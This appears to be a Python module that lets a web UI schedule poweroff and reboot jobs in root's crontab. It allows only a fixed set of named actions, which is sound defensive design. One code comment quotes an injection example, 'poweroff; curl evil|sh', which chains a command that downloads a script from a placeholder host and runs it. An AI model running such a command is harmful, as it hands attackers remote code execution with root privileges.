import os
from getpass import getuser

from crontab import CronTab

# Named actions, never free-form commands.
#
# These lines land in *root's* crontab and cron hands each one to /bin/sh, so
# anything assembled from what a user typed in the web UI would be a straight
# privilege escalation: a job "command" of `poweroff; curl evil|sh` would run
# as written. The API therefore accepts one of these keys and nothing else, and
# the command itself is looked up here and never comes from the request.
#
# Keys are what travels over the WebSocket API and what the web UI stores; the
# values are absolute paths, because cron's PATH is minimal and not worth
# relying on.
ACTIONS: dict[str, str] = {
    'pwr': '/usr/sbin/poweroff',
    'reb': '/usr/sbin/reboot',
}

# Reverse map, for reading a crontab back. A job whose command is not in here
# was not written by us (or was written by a newer version) and is reported
# as-is and left alone rather than rewritten into something we recognise.
_ACTION_OF_COMMAND: dict[str, str] = {command: name for name, command in ACTIONS.items()}


class UniCron(CronTab):
    __job_prefix = 'unitotem:-)'

    def new(self, cmd: str = '', m=None, h=None, dom=None, mon=None, dow=None, **_):
        command = ACTIONS.get(cmd)
        if command is None:
            return False
        item = super().new(
            command,                                    # command
            self.__job_prefix + os.urandom(16).hex()    # comment
        )
        if None not in [m, h, dom, mon, dow]:
            item.setall(m, h, dom, mon, dow)  # time
        return True

    def read(self, filename=None) -> 'UniCron':
        super().read(filename)
        return self

    def __enter__(self) -> 'UniCron':
        return self.read()

    def findById(self, uuid: str = None):
        for job in list(self.crons):
            if job.comment.startswith(self.__job_prefix) and (uuid is None or job.comment[11:] == uuid):
                yield job

    def removeById(self, uuid: str = None):
        for job in self.findById(uuid):
            # noinspection PyUnresolvedReferences
            self._remove(job)

    def serialize(self):
        # Every field is the raw cron slice, as a string.
        #
        # It used to be int(str(job.minute)), which raises ValueError on any
        # slice that is not a plain number - and '*' is the default the web UI
        # offers for every field. A single "every day at 22:00" timer, whose
        # day-of-month, month and day-of-week are all '*', therefore blew up
        # getJobs for the *whole* list, so one wildcard made every timer on the
        # node invisible. Ranges and steps ('*/15', '1-5', '0,30') could never
        # be represented either.
        #
        # 'command' is the action key, not the path: the path is an
        # implementation detail of this module, and the web UI has always
        # labelled rows by matching against the key (it just never matched,
        # because a full path was sent).
        return [{
            'uuid': job.comment.removeprefix(self.__job_prefix),
            'command': _ACTION_OF_COMMAND.get(job.command, job.command),
            # True when we recognise the command, i.e. when it is safe to offer
            # editing it. A job we did not write keeps its schedule editable but
            # must not have its command rewritten.
            'known': job.command in _ACTION_OF_COMMAND,
            'minute': str(job.minute),
            'hour': str(job.hour),
            'dayOfMonth': str(job.dom),
            'month': str(job.month),
            'dayOfWeek': str(job.dow),
            'enabled': job.enabled,
        } for job in self.findById()]


CRONTAB = UniCron(user=getuser())
